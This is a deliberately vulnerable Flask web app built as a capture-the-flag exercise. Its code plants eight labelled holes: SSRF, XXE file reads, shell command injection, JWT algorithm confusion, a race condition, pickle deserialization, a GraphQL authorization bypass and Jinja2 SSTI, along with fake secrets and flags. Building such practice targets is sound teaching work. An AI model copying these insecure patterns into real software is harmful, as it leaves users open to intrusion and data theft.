"""
NexusCore Technologies — Internal Security Portal
CTF Round 2 | Port 7007
8 Advanced Vulnerabilities — Unique from Round 1
"""
from flask import Flask, request, jsonify, session, render_template_string
import sqlite3, os, hashlib, hmac, base64, json, pickle, time, threading
import urllib.request, re, html
from xml.etree import ElementTree as ET
from jinja2 import Environment
import subprocess

app = Flask(__name__)
app.secret_key = "nexuscore_r2_secret_2024"
DB   = os.path.join(os.path.dirname(os.path.abspath(__file__)), "nexuscore.db")
BASE = os.path.dirname(os.path.abspath(__file__))

JWT_PUBLIC_KEY  = "nexuscore-public-key-2024"
JWT_RSA_SECRET  = "nexuscore-rsa-private-2024"

# ── DB ────────────────────────────────────────────────────
def get_db():
    db = sqlite3.connect(DB)
    db.row_factory = sqlite3.Row
    return db

def sha256(p): return hashlib.sha256(p.encode()).hexdigest()

def init_db():
    db = get_db()
    db.executescript("""
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, emp_id TEXT UNIQUE,
        username TEXT UNIQUE, password TEXT, full_name TEXT, email TEXT,
        role TEXT DEFAULT 'engineer', department TEXT,
        clearance INTEGER DEFAULT 1, joined TEXT, salary REAL, phone TEXT
    );
    CREATE TABLE IF NOT EXISTS projects (
        id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT UNIQUE,
        name TEXT, client TEXT, budget REAL, status TEXT, lead TEXT,
        classification TEXT DEFAULT 'INTERNAL', start_date TEXT, end_date TEXT, description TEXT
    );
    CREATE TABLE IF NOT EXISTS vulnerabilities (
        id INTEGER PRIMARY KEY AUTOINCREMENT, cve_id TEXT, title TEXT,
        severity TEXT, cvss_score REAL, affected_system TEXT,
        description TEXT, status TEXT, assigned_to TEXT, discovered TEXT, remediation TEXT
    );
    CREATE TABLE IF NOT EXISTS licenses (
        id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT UNIQUE, product TEXT,
        seats INTEGER, used_seats INTEGER DEFAULT 0, value REAL,
        status TEXT DEFAULT 'active', redeemed_by TEXT
    );
    CREATE TABLE IF NOT EXISTS audit_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user TEXT, action TEXT,
        ip TEXT, ts DATETIME DEFAULT CURRENT_TIMESTAMP, details TEXT
    );
    CREATE TABLE IF NOT EXISTS assets (
        id INTEGER PRIMARY KEY AUTOINCREMENT, asset_id TEXT UNIQUE,
        hostname TEXT, ip TEXT, os TEXT, department TEXT,
        criticality TEXT, last_scan TEXT, vuln_count INTEGER DEFAULT 0
    );
    CREATE TABLE IF NOT EXISTS tickets (
        id INTEGER PRIMARY KEY AUTOINCREMENT, ticket_id TEXT UNIQUE,
        title TEXT, priority TEXT, status TEXT DEFAULT 'open',
        assigned_to TEXT, created_by TEXT, created TEXT, description TEXT, resolution TEXT
    );
    """)

    users = [
        ("EMP001","admin",      sha256("NexusCore@2024!"), "Aryan Mehta",   "aryan.mehta@nexuscore.io",   "ciso",     "Security",     5,"2019-03-15",220000,"9876500001"),
        ("EMP002","jiya.sharma",sha256("Jiya@secure99"),   "Jiya Sharma",   "jiya.sharma@nexuscore.io",   "sre",      "Infrastructure",3,"2020-07-01",140000,"9876500002"),
        ("EMP003","karan.dev",  sha256("Karan#dev2023"),   "Karan Verma",   "karan.verma@nexuscore.io",   "engineer", "Development",  2,"2021-01-20",105000,"9876500003"),
        ("EMP004","priya.ops",  sha256("Priya!ops456"),    "Priya Nambiar", "priya.nambiar@nexuscore.io", "devops",   "Operations",   3,"2021-06-10",125000,"9876500004"),
        ("EMP005","rahul.sec",  sha256("Rahul@sec789"),    "Rahul Saxena",  "rahul.saxena@nexuscore.io",  "analyst",  "Security",     2,"2022-03-05", 95000,"9876500005"),
        ("EMP006","sneha.hr",   sha256("Sneha#hr2024"),    "Sneha Pillai",  "sneha.pillai@nexuscore.io",  "hr",       "HR",           1,"2022-09-15", 80000,"9876500006"),
        ("EMP007","demo",       sha256("demo123"),           "Demo User",     "demo@nexuscore.io",          "engineer", "Development",  1,"2024-01-01", 75000,"9876500007"),
    ]
    for u in users:
        try: db.execute("INSERT INTO users (emp_id,username,password,full_name,email,role,department,clearance,joined,salary,phone) VALUES (?,?,?,?,?,?,?,?,?,?,?)", u)
        except: pass

    projects = [
        ("PROJ-001","Operation Sentinel",  "Ministry of Defence",  45000000,"active","aryan.mehta","TOP SECRET",  "2023-01-15","2025-06-30","Advanced threat detection for national critical infrastructure."),
        ("PROJ-002","CloudShield v3",      "HDFC Bank Ltd",         8500000,"active","jiya.sharma","CONFIDENTIAL","2023-06-01","2024-12-31","Zero-trust cloud security architecture implementation."),
        ("PROJ-003","PaySafe Gateway",     "PhonePe Technologies",  3200000,"active","karan.dev",  "INTERNAL",    "2024-01-10","2024-09-30","PCI-DSS compliant payment gateway security audit."),
        ("PROJ-004","SecureHealth API",    "Apollo Hospitals",      2800000,"review","priya.ops",  "CONFIDENTIAL","2023-11-01","2024-08-15","HIPAA-compliant healthcare data API hardening."),
        ("PROJ-005","ThreatHunter AI",     "Internal R&D",          1500000,"active","rahul.sec",  "INTERNAL",    "2024-02-01","2024-12-31","ML-based threat hunting platform development."),
        ("PROJ-006","RedTeam Infra",       "Internal",               500000,"active","aryan.mehta","TOP SECRET",  "2024-01-01","2024-12-31","Internal red team tooling and infrastructure."),
    ]
    for p in projects:
        try: db.execute("INSERT INTO projects (code,name,client,budget,status,lead,classification,start_date,end_date,description) VALUES (?,?,?,?,?,?,?,?,?,?)", p)
        except: pass

    vulns = [
        ("CVE-2024-1337","Remote Code Execution in OpenSSL",       "CRITICAL",9.8,"Core Infrastructure","Buffer overflow in TLS 1.3 handshake allows unauthenticated RCE via crafted ClientHello.","in-progress","rahul.sec","2024-01-15","Apply patch: openssl-3.2.1"),
        ("CVE-2024-2891","SQL Injection in Internal CRM",           "HIGH",   8.2,"CRM System",         "Unsanitised input in customer search endpoint allows full DB read via UNION attacks.","patched",    "karan.dev","2024-02-03","Deployed parameterised queries."),
        ("CVE-2024-3142","Privilege Escalation via SUID Binary",    "HIGH",   7.9,"Linux Servers",      "SUID bit set on custom backup script allows local privilege escalation to root.","in-progress","priya.ops","2024-02-20","Remove SUID bit; enforce sudo policy."),
        ("CVE-2024-4056","Exposed Internal API — No Authentication","CRITICAL",9.1,"Microservices",     "Internal analytics API reachable without token; returns all customer telemetry data.","patched",    "jiya.sharma","2024-03-01","Added mTLS + API key enforcement."),
        ("CVE-2024-5019","Weak JWT Secret in Auth Service",         "HIGH",   8.0,"Auth Platform",     "JWT signed with 8-char secret; crackable via hashcat in <2 minutes.","in-progress","rahul.sec","2024-03-15","Rotating to RSA-2048 key pair."),
        ("CVE-2024-6203","SSRF in Webhook Handler",                 "HIGH",   7.5,"Webhook Service",   "Attacker-controlled URL fetched server-side; allows internal network enumeration.","review",     "karan.dev","2024-04-02","Implement URL allowlist + SSRF proxy."),
        ("CVE-2024-7114","Log4Shell in Legacy Logger",              "CRITICAL",10.0,"Legacy Systems",   "JNDI injection via log4j 2.x in reporting module allows RCE via LDAP callback.","patched",    "aryan.mehta","2023-12-18","Upgraded log4j to 2.17.1."),
        ("CVE-2024-8825","Insecure Deserialization — Session Store","CRITICAL",9.3,"Session Service",   "Pickle-based session import endpoint deserialises untrusted data enabling arbitrary code execution.","in-progress","rahul.sec","2024-04-20","Replace pickle with signed JSON."),
    ]
    for v in vulns:
        try: db.execute("INSERT INTO vulnerabilities (cve_id,title,severity,cvss_score,affected_system,description,status,assigned_to,discovered,remediation) VALUES (?,?,?,?,?,?,?,?,?,?)", v)
        except: pass

    licenses = [
        ("NEXUS-GOLD-2024","NexusShield Enterprise",50,0,500000,"active",None),
        ("SEC-PLAT-7X9K",  "SecureOps Platform",   10,0,120000,"active",None),
        ("HUNT-PRO-2024",  "ThreatHunter Pro",       5,0, 75000,"active",None),
        ("DEMO-FREE-0001", "Demo License",            1,0,     0,"active",None),
    ]
    for l in licenses:
        try: db.execute("INSERT INTO licenses (code,product,seats,used_seats,value,status,redeemed_by) VALUES (?,?,?,?,?,?,?)", l)
        except: pass

    assets = [
        ("AST-001","prod-web-01",   "10.0.1.10","Ubuntu 22.04 LTS","Infrastructure","CRITICAL","2024-03-15",3),
        ("AST-002","prod-db-01",    "10.0.1.20","CentOS 8",         "Infrastructure","CRITICAL","2024-03-10",1),
        ("AST-003","dev-build-01",  "10.0.2.10","Ubuntu 20.04 LTS","Development",   "HIGH",    "2024-03-20",5),
        ("AST-004","corp-vpn-01",   "10.0.3.10","pfSense 2.7",      "Network",       "CRITICAL","2024-03-01",0),
        ("AST-005","k8s-master-01", "10.0.1.30","Kubernetes 1.28",  "Infrastructure","CRITICAL","2024-03-18",2),
        ("AST-006","monitoring-01", "10.0.4.10","Prometheus+Grafana","Operations",   "MEDIUM",  "2024-03-22",0),
        ("AST-007","intern-dev-07", "10.0.5.47","Windows 11 Pro",   "Development",   "LOW",     "2024-02-28",8),
    ]
    for a in assets:
        try: db.execute("INSERT INTO assets (asset_id,hostname,ip,os,department,criticality,last_scan,vuln_count) VALUES (?,?,?,?,?,?,?,?)", a)
        except: pass

    tickets = [
        ("TKT-2024-001","Prod DB High CPU — Investigate",      "P1","resolved",   "priya.ops",  "rahul.sec","2024-03-10","CPU spiked 98% at 03:00 IST. Possible SQLi or rogue query.","Query optimised. Added pg_stat monitoring."),
        ("TKT-2024-002","SSL Cert Expiry Warning — vpn-01",    "P2","open",        "jiya.sharma","system",   "2024-03-18","SSL cert on corp-vpn-01 expires in 12 days.","Pending Let's Encrypt renewal."),
        ("TKT-2024-003","Suspicious Login — Multiple Failures","P2","in-progress", "rahul.sec",  "system",   "2024-03-20","203.0.113.45 — 47 failed attempts on 'demo' account.","Temp geo-block applied. Investigating."),
        ("TKT-2024-004","NexusShield License Renewal",         "P3","open",        "sneha.hr",   "admin",    "2024-03-22","NEXUS-GOLD-2024 expires 2024-12-31. Renewal quote needed.","Awaiting procurement approval."),
        ("TKT-2024-005","XXE in Report Upload — Pentest Finding","P1","in-progress","karan.dev", "aryan.mehta","2024-04-10","External pentest found XXE in /api/reports/upload endpoint.","Fixing XML parser config."),
    ]
    for t in tickets:
        try: db.execute("INSERT INTO tickets (ticket_id,title,priority,status,assigned_to,created_by,created,description,resolution) VALUES (?,?,?,?,?,?,?,?,?)", t)
        except: pass

    logs = [
        ("admin",      "LOGIN_SUCCESS", "192.168.1.10","Role: CISO | Session initiated"),
        ("jiya.sharma","REPORT_EXPORT", "192.168.1.22","Project: CloudShield | Format: PDF"),
        ("karan.dev",  "CODE_PUSH",     "10.0.2.15",   "Branch: feature/xxe-fix | Commit: a3f9d12"),
        ("rahul.sec",  "VULN_SCAN",     "10.0.5.30",   "Target: prod-web-01 | 3 findings"),
        ("admin",      "POLICY_UPDATE", "192.168.1.10","Password rotation: 90 days"),
        ("priya.ops",  "INFRA_DEPLOY",  "10.0.2.10",   "auth-svc v2.3.1 → prod-k8s"),
        ("demo",       "LOGIN_FAIL",    "203.0.113.45", "Invalid credentials — attempt 3/5"),
    ]
    for l in logs:
        try: db.execute("INSERT INTO audit_logs (user,action,ip,details) VALUES (?,?,?,?)", l)
        except: pass

    os.makedirs(os.path.join(BASE,"internal"), exist_ok=True)
    with open(os.path.join(BASE,"internal","config.json"),"w") as f:
        json.dump({
            "db_host":"10.0.1.20","db_port":5432,"db_name":"nexuscore_prod",
            "db_password":"Pr0d_DB_S3cr3t!","redis":"10.0.1.25:6379",
            "jwt_secret": JWT_RSA_SECRET,
            "admin_api_key":"ncx-prod-key-8f3a9b2c",
            "backup_s3":"s3://nexuscore-prod-backups/",
            "FLAG":"NEXUSCORE{SSRF_internal_config_pwned}",
            "note":"CONFIDENTIAL — Internal use only"
        }, f, indent=2)
    with open(os.path.join(BASE,"secret.txt"),"w") as f:
        f.write("NEXUSCORE_MASTER_KEY=NxC0r3_M4st3r_2024!\nADMIN_PASS=NexusCore@2024!\nFLAG=NEXUSCORE{xxe_path_traversal_win}\n")
    db.commit(); db.close()


# ── JWT ───────────────────────────────────────────────────
def make_jwt(payload, algorithm="RS256"):
    hdr = base64.urlsafe_b64encode(json.dumps({"alg":algorithm,"typ":"JWT"}).encode()).rstrip(b"=").decode()
    bdy = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    sec = JWT_RSA_SECRET if algorithm == "RS256" else JWT_PUBLIC_KEY
    sig = base64.urlsafe_b64encode(hmac.new(sec.encode(),f"{hdr}.{bdy}".encode(),hashlib.sha256).digest()).rstrip(b"=").decode()
    return f"{hdr}.{bdy}.{sig}"

def verify_jwt(token):
    """VULN V4: Accepts algorithm from token header — RS256→HS256 confusion"""
    try:
        p = token.split(".")
        if len(p)!=3: return None
        pad = lambda s: s + "="*(4-len(s)%4)
        hdr = json.loads(base64.urlsafe_b64decode(pad(p[0])))
        alg = hdr.get("alg","RS256")
        sec = JWT_RSA_SECRET if alg=="RS256" else JWT_PUBLIC_KEY  # VULN: trusts alg claim
        exp = base64.urlsafe_b64encode(hmac.new(sec.encode(),f"{p[0]}.{p[1]}".encode(),hashlib.sha256).digest()).rstrip(b"=").decode()
        if p[2]!=exp: return None
        return json.loads(base64.urlsafe_b64decode(pad(p[1])))
    except: return None

def jwt_user():
    tok = request.cookies.get("ncx_token") or request.headers.get("Authorization","").replace("Bearer ","")
    return verify_jwt(tok) if tok else None


# ── AUTH ──────────────────────────────────────────────────
@app.route("/api/auth/login", methods=["POST"])
def login():
    d = request.get_json()
    db = get_db()
    u  = db.execute("SELECT * FROM users WHERE username=? AND password=?",
                    (d.get("username",""), sha256(d.get("password","")))).fetchone()
    if not u: return jsonify({"error":"Invalid credentials"}), 401
    payload = {"id":u["id"],"username":u["username"],"emp_id":u["emp_id"],
               "role":u["role"],"clearance":u["clearance"],"full_name":u["full_name"]}
    token = make_jwt(payload)
    db.execute("INSERT INTO audit_logs (user,action,ip,details) VALUES (?,?,?,?)",
               (u["username"],"LOGIN_SUCCESS",request.remote_addr,f"Role:{u['role']}"))
    db.commit()
    resp = jsonify({"success":True,"token":token,"user":dict(u)})
    resp.set_cookie("ncx_token",token,httponly=False,samesite="Lax")
    return resp

@app.route("/api/auth/logout", methods=["POST"])
def logout():
    resp = jsonify({"success":True})
    resp.delete_cookie("ncx_token")
    return resp

@app.route("/api/auth/public-key")
def public_key():
    """VULN V4: Exposes public key needed for algorithm confusion"""
    return jsonify({"public_key":JWT_PUBLIC_KEY,"algorithm":"RS256","issuer":"NexusCore-Auth-v2.1","key_id":"ncx-2024-primary"})


# ── DATA APIS ─────────────────────────────────────────────
@app.route("/api/dashboard")
def dashboard():
    u = jwt_user()
    if not u: return jsonify({"error":"Unauthorized"}), 401
    db = get_db()
    return jsonify({
        "stats":{
            "active_projects": db.execute("SELECT COUNT(*) FROM projects WHERE status='active'").fetchone()[0],
            "open_vulns":      db.execute("SELECT COUNT(*) FROM vulnerabilities WHERE status!='patched'").fetchone()[0],
            "critical_vulns":  db.execute("SELECT COUNT(*) FROM vulnerabilities WHERE severity='CRITICAL'").fetchone()[0],
            "total_assets":    db.execute("SELECT COUNT(*) FROM assets").fetchone()[0],
            "open_tickets":    db.execute("SELECT COUNT(*) FROM tickets WHERE status='open' OR status='in-progress'").fetchone()[0],
        },
        "recent_logs":    [dict(r) for r in db.execute("SELECT * FROM audit_logs ORDER BY ts DESC LIMIT 7").fetchall()],
        "critical_vulns": [dict(v) for v in db.execute("SELECT * FROM vulnerabilities WHERE severity='CRITICAL' LIMIT 4").fetchall()],
    })

@app.route("/api/projects")
def projects():
    u = jwt_user()
    if not u: return jsonify({"error":"Unauthorized"}), 401
    db = get_db()
    rows = db.execute("SELECT * FROM projects").fetchall() if u.get("clearance",0)>=3 \
           else db.execute("SELECT * FROM projects WHERE classification='INTERNAL'").fetchall()
    return jsonify([dict(r) for r in rows])

@app.route("/api/vulnerabilities")
def vulnerabilities():
    u = jwt_user()
    if not u: return jsonify({"error":"Unauthorized"}), 401
    db = get_db()
    return jsonify([dict(r) for r in db.execute("SELECT * FROM vulnerabilities ORDER BY cvss_score DESC").fetchall()])

@app.route("/api/assets")
def assets():
    u = jwt_user()
    if not u: return jsonify({"error":"Unauthorized"}), 401
    db = get_db()
    return jsonify([dict(r) for r in db.execute("SELECT * FROM assets").fetchall()])

@app.route("/api/tickets")
def tickets():
    u = jwt_user()
    if not u: return jsonify({"error":"Unauthorized"}), 401
    db = get_db()
    return jsonify([dict(r) for r in db.execute("SELECT * FROM tickets ORDER BY created DESC").fetchall()])

@app.route("/api/team")
def team():
    u = jwt_user()
    if not u: return jsonify({"error":"Unauthorized"}), 401
    db = get_db()
    rows = db.execute("SELECT * FROM users").fetchall() if u.get("role") in ["ciso","hr"] \
           else db.execute("SELECT id,emp_id,username,full_name,email,role,department,clearance,joined FROM users").fetchall()
    return jsonify([dict(r) for r in rows])

@app.route("/api/audit-logs")
def audit_logs():
    u = jwt_user()
    if not u: return jsonify({"error":"Unauthorized"}), 401
    db = get_db()
    return jsonify([dict(r) for r in db.execute("SELECT * FROM audit_logs ORDER BY ts DESC LIMIT 50").fetchall()])


# ══════════════════════════════════════════════════════════
#  VULNERABILITY ENDPOINTS
# ══════════════════════════════════════════════════════════

# ── V1: SSRF ──────────────────────────────────────────────
@app.route("/api/integrations/fetch", methods=["POST"])
def ssrf():
    """VULN V1: SSRF — no URL validation"""
    u = jwt_user()
    if not u: return jsonify({"error":"Unauthorized"}), 401
    url = request.get_json().get("url","")
    if not url: return jsonify({"error":"url required"}), 400
    try:
        req  = urllib.request.Request(url, headers={"User-Agent":"NexusCore-Integration/1.0"})
        resp = urllib.request.urlopen(req, timeout=5)
        return jsonify({"status":resp.status,"content":resp.read().decode("utf-8","replace")[:4000],"url":url})
    except Exception as e:
        return jsonify({"error":str(e),"url":url}), 500

@app.route("/internal/metadata")
def internal_metadata():
    if request.remote_addr not in ["127.0.0.1","::1"]: return "Forbidden",403
    return jsonify({
        "instance-id":"i-0a1b2c3d4e5f67890","region":"ap-south-1",
        "iam-role":"nexuscore-prod-iam",
        "credentials":{
            "AccessKeyId":"AKIA5NEXUSCORE2024X",
            "SecretAccessKey":"wJalrXUtnFEMI/K7MDENG/NEXUSCORE_KEY",
            "FLAG":"NEXUSCORE{SSRF_metadata_service_compromised}"
        },
        "user-data":"#!/bin/bash\nexport DB_PASS='Pr0d_DB_S3cr3t!'\nexport JWT_SECRET='nexuscore-rsa-private-2024'\n"
    })

@app.route("/internal/config")
def internal_config():
    if request.remote_addr not in ["127.0.0.1","::1"]: return "Forbidden",403
    return open(os.path.join(BASE,"internal","config.json")).read(), 200, {"Content-Type":"application/json"}

# ── V2: XXE ───────────────────────────────────────────────
@app.route("/api/reports/upload", methods=["POST"])
def xxe():
    """VULN V2: XXE — resolves SYSTEM file:// entities"""
    u = jwt_user()
    if not u: return jsonify({"error":"Unauthorized"}), 401
    xml_str = ""
    if request.content_type and "json" in request.content_type:
        xml_str = request.get_json().get("xml","")
    else:
        xml_str = request.data.decode("utf-8","replace")
    if not xml_str: return jsonify({"error":"XML required"}), 400
    try:
        file_refs = re.findall(r'<!ENTITY\s+\w+\s+SYSTEM\s+"file://([^"]+)"', xml_str)
        entities  = {}
        for fref in file_refs:
            try: entities[fref] = open(fref).read()
            except Exception as e: entities[fref] = f"Error: {e}"
        clean = re.sub(r'<!DOCTYPE[^>]*(\[[^\]]*\])?\s*>', '', xml_str, flags=re.DOTALL)
        try:
            root   = ET.fromstring(clean)
            parsed = {"tag":root.tag,"attrib":root.attrib,
                      "children":[{"tag":c.tag,"text":c.text,"attrib":c.attrib} for c in root]}
        except: parsed = {"error":"Could not parse cleaned XML"}
        result = {"parsed":parsed,"report_id":f"RPT-{int(time.time())}"}
        if entities: result["external_entities"] = entities
        return jsonify(result)
    except Exception as e: return jsonify({"error":str(e)}), 400

# ── V3: COMMAND INJECTION ─────────────────────────────────
@app.route("/api/diagnostics/run", methods=["POST"])
def cmd_inject():
    """VULN V3: Command Injection — host param unsanitised"""
    u = jwt_user()
    if not u: return jsonify({"error":"Unauthorized"}), 401
    if u.get("clearance",0) < 2: return jsonify({"error":"Insufficient clearance"}), 403
    d    = request.get_json()
    host = d.get("host","")
    tool = d.get("tool","ping")
    if not host: return jsonify({"error":"host required"}), 400
    cmds = {"ping":f"ping -c 3 {host}","nslookup":f"nslookup {host}",
            "traceroute":f"traceroute -m 5 {host}","curl":f"curl -I --max-time 3 {host}"}
    cmd = cmds.get(tool, f"ping -c 3 {host}")
    try:
        r = subprocess.run(cmd+" 2>&1", shell=True, capture_output=True, text=True, timeout=10)
        return jsonify({"command":cmd,"stdout":r.stdout,"stderr":r.stderr,"returncode":r.returncode})
    except Exception as e: return jsonify({"error":str(e)}), 500

# ── V4: JWT ADMIN (Algorithm Confusion checked in verify_jwt) ──
@app.route("/api/admin/users")
def admin_users():
    u = jwt_user()
    if not u: return jsonify({"error":"Unauthorized"}), 401
    if u.get("role") not in ["ciso","admin"]:
        return jsonify({"error":"CISO clearance required","your_role":u.get("role")}), 403
    db = get_db()
    return jsonify([dict(r) for r in db.execute("SELECT * FROM users").fetchall()])

@app.route("/api/admin/keys")
def admin_keys():
    u = jwt_user()
    if not u: return jsonify({"error":"Unauthorized"}), 401
    if u.get("role") not in ["ciso","admin"]: return jsonify({"error":"Forbidden"}), 403
    return jsonify({"api_keys":["ncx-prod-key-8f3a9b2c","ncx-ci-key-3d7e1f4a","ncx-mon-key-9c2b5e8d"],
                    "FLAG":"NEXUSCORE{jwt_algo_confusion_rs256_hs256}"})

# ── V5: RACE CONDITION ────────────────────────────────────
@app.route("/api/licenses/redeem", methods=["POST"])
def race_redeem():
    """VULN V5: Race Condition — non-atomic check-then-act"""
    u = jwt_user()
    if not u: return jsonify({"error":"Unauthorized"}), 401
    code = request.get_json().get("code","")
    db   = get_db()
    lic  = db.execute("SELECT * FROM licenses WHERE code=? AND status='active'", (code,)).fetchone()
    if not lic: return jsonify({"error":"Invalid license"}), 404
    time.sleep(0.15)   # simulate DB latency — widens race window
    cur = db.execute("SELECT used_seats FROM licenses WHERE code=?", (code,)).fetchone()
    if cur["used_seats"] >= lic["seats"]:
        return jsonify({"error":"All seats used","used":cur["used_seats"],"total":lic["seats"]}), 400
    db.execute("UPDATE licenses SET used_seats=used_seats+1, redeemed_by=? WHERE code=?", (u["username"],code))
    db.commit()
    upd = db.execute("SELECT * FROM licenses WHERE code=?", (code,)).fetchone()
    return jsonify({"success":True,"product":lic["product"],"seat_number":upd["used_seats"],
                    "total":lic["seats"],"value_unlocked":lic["value"],
                    "FLAG": "NEXUSCORE{race_condition_seats_exceeded}" if upd["used_seats"] > lic["seats"] else None})

@app.route("/api/licenses")
def list_licenses():
    u = jwt_user()
    if not u: return jsonify({"error":"Unauthorized"}), 401
    db = get_db()
    return jsonify([dict(r) for r in db.execute("SELECT code,product,seats,used_seats,value,status FROM licenses").fetchall()])

# ── V6: INSECURE DESERIALIZATION ──────────────────────────
@app.route("/api/session/export")
def sess_export():
    u = jwt_user()
    if not u: return jsonify({"error":"Unauthorized"}), 401
    data = {"username":u["username"],"role":u["role"],"emp_id":u["emp_id"],"ts":int(time.time())}
    return jsonify({"session_data":base64.b64encode(pickle.dumps(data)).decode(),"format":"pickle/base64"})

@app.route("/api/session/import", methods=["POST"])
def sess_import():
    """VULN V6: Insecure Deserialization — pickle.loads on untrusted data"""
    u = jwt_user()
    if not u: return jsonify({"error":"Unauthorized"}), 401
    b64 = request.get_json().get("session_data","")
    if not b64: return jsonify({"error":"session_data required"}), 400
    try:
        obj = pickle.loads(base64.b64decode(b64))
        return jsonify({"success":True,"session":obj if isinstance(obj,dict) else str(obj),"type":type(obj).__name__})
    except Exception as e: return jsonify({"error":str(e)}), 400

# ── V7: GRAPHQL ───────────────────────────────────────────
GQL_USERS = [
    {"id":1,"username":"admin","role":"ciso","salary":220000,"secret_note":"FLAG{graphql_field_injection_win}","department":"Security"},
    {"id":2,"username":"jiya.sharma","role":"sre","salary":140000,"secret_note":"private","department":"Infrastructure"},
    {"id":3,"username":"karan.dev","role":"engineer","salary":105000,"secret_note":"private","department":"Development"},
    {"id":7,"username":"demo","role":"engineer","salary":75000,"secret_note":"your_own","department":"Development"},
]
GQL_PROJECTS = [
    {"id":1,"code":"PROJ-001","budget":45000000,"classification":"TOP SECRET","internal_notes":"MoD — Do not disclose"},
    {"id":2,"code":"PROJ-002","budget":8500000,"classification":"CONFIDENTIAL","internal_notes":"HDFC audit findings Q1"},
]

@app.route("/api/graphql", methods=["POST"])
def graphql():
    """VULN V7: GraphQL — introspection + field-level auth bypass"""
    u = jwt_user()
    if not u: return jsonify({"error":"Unauthorized"}), 401
    q = request.get_json().get("query","")
    if not q: return jsonify({"error":"query required"}), 400
    if "__schema" in q or "__type" in q:
        return jsonify({"data":{"__schema":{"types":[
            {"name":"User","fields":[{"name":"id"},{"name":"username"},{"name":"role"},
             {"name":"salary","description":"RESTRICTED — admin only"},
             {"name":"secret_note","description":"RESTRICTED — admin only"},{"name":"department"}]},
            {"name":"Project","fields":[{"name":"id"},{"name":"code"},{"name":"budget"},
             {"name":"classification"},{"name":"internal_notes"}]},
            {"name":"Query","fields":[
                {"name":"users","description":"List users"},
                {"name":"projects","description":"Clearance-gated projects"},
                {"name":"auditLogs","description":"System audit trail"},
            ]}
        ]}}})
    result = {}
    if "users" in q:
        wants_priv = any(f in q for f in ["salary","secret_note"])
        result["users"] = GQL_USERS if wants_priv else [{"id":x["id"],"username":x["username"],"role":x["role"]} for x in GQL_USERS]
    if "projects" in q:
        result["projects"] = GQL_PROJECTS
    if "auditLogs" in q:
        db = get_db()
        result["auditLogs"] = [dict(r) for r in db.execute("SELECT * FROM audit_logs ORDER BY ts DESC LIMIT 20").fetchall()]
    if not result: return jsonify({"errors":[{"message":"Unknown fields"}]}), 400
    return jsonify({"data":result})

# ── V8: SSTI ──────────────────────────────────────────────
@app.route("/api/notifications/preview", methods=["POST"])
def ssti():
    """VULN V8: SSTI — user template rendered by Jinja2 without sandbox"""
    u = jwt_user()
    if not u: return jsonify({"error":"Unauthorized"}), 401
    d       = request.get_json()
    tmpl    = d.get("template","")
    ctx     = d.get("context",{"name":u.get("full_name","User"),"company":"NexusCore"})
    if not tmpl: return jsonify({"error":"template required"}), 400
    try:
        env      = Environment()
        rendered = env.from_string(tmpl).render(**ctx)
        return jsonify({"preview":rendered,"template":tmpl})
    except Exception as e: return jsonify({"error":str(e)}), 400


# ── FRONTEND ──────────────────────────────────────────────
@app.route("/", defaults={"path":""})
@app.route("/<path:path>")
def frontend(path): return render_template_string(HTML)

HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>NexusCore Technologies — Internal Portal</title>
<style>
:root{
  --bg:#080d18;--bg2:#0c1220;--bg3:#101829;--bg4:#141e30;
  --card:#0f1828;--card2:#131e2e;
  --border:#1a2840;--border2:#1e3050;
  --accent:#3b82f6;--a2:#60a5fa;--adark:#1d4ed8;
  --green:#10b981;--red:#ef4444;--yellow:#f59e0b;
  --purple:#8b5cf6;--orange:#f97316;--cyan:#06b6d4;
  --text:#e2e8f0;--muted:#4b6080;--muted2:#8098b8;
  --mono:'Courier New',monospace;
}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,'Segoe UI',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;font-size:13px}
::-webkit-scrollbar{width:4px;height:4px}::-webkit-scrollbar-track{background:var(--bg2)}::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}

/* ─ TOPBAR ─ */
.topbar{background:var(--bg2);border-bottom:1px solid var(--border);height:52px;display:flex;align-items:center;justify-content:space-between;padding:0 1.5rem;position:sticky;top:0;z-index:100;box-shadow:0 2px 20px rgba(0,0,0,.5)}
.brand{display:flex;align-items:center;gap:10px}
.logo{width:33px;height:33px;background:linear-gradient(135deg,var(--accent),var(--purple));border-radius:8px;display:grid;place-items:center;font-weight:900;font-size:.9rem;color:#fff;box-shadow:0 0 14px rgba(59,130,246,.35)}
.brand-name{font-size:.95rem;font-weight:800;color:#fff;letter-spacing:.02em}
.brand-tag{color:var(--muted);font-size:.62rem;margin-top:1px}
.topbar-r{display:flex;align-items:center;gap:12px}
.spill{display:flex;align-items:center;gap:5px;background:rgba(16,185,129,.07);border:1px solid rgba(16,185,129,.18);color:var(--green);padding:.22rem .6rem;border-radius:20px;font-size:.66rem;font-weight:600}
.spill-dot{width:6px;height:6px;background:var(--green);border-radius:50%;animation:blink 2s infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
.av{width:28px;height:28px;background:linear-gradient(135deg,var(--accent),var(--purple));border-radius:50%;display:grid;place-items:center;font-size:.7rem;font-weight:700;color:#fff}
.uname{font-size:.76rem;font-weight:500;color:var(--text)}
.urole{font-size:.62rem;color:var(--muted)}
.btn-out{background:transparent;border:1px solid var(--border2);color:var(--muted2);padding:.25rem .7rem;border-radius:4px;font-size:.7rem;cursor:pointer;transition:all .15s}
.btn-out:hover{border-color:var(--red);color:var(--red)}

/* ─ LAYOUT ─ */
.layout{display:flex;height:calc(100vh - 52px)}
.sidebar{width:196px;min-width:196px;background:var(--bg2);border-right:1px solid var(--border);padding:.75rem 0;overflow-y:auto}
.slabel{font-size:.58rem;text-transform:uppercase;letter-spacing:.12em;color:var(--muted);padding:.35rem .9rem;font-weight:600;margin-top:.35rem}
.nitem{display:flex;align-items:center;gap:.55rem;padding:.45rem .9rem;color:var(--muted2);font-size:.76rem;cursor:pointer;transition:all .15s;border-left:2px solid transparent;white-space:nowrap}
.nitem:hover{background:rgba(59,130,246,.06);color:var(--text)}
